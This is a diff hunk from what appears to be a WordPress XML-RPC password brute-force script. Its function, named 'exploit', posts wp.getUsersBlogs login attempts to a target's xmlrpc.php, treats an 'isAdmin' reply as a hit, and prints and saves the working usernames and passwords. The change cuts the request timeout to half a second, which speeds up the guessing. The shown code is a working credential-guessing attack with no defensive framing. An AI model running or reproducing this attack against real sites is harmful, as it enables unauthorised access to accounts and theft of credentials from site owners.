@@ -33,7 +33,7 @@ def exploit(url, user_url, list_password):
 		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
 
 		headers = {'Content-Type':'text/xml'}
-		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
+		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=0.5)
 		if "isAdmin" in str(r.content):
 			print(colored("[{}][+] User: [{}] Pass: [{}] Url: {} ".format(local_time(),user_url,list_password,url), "green"))
 			save("User [{}] Pass [{}] Url {}".format(user_url,list_password,url))
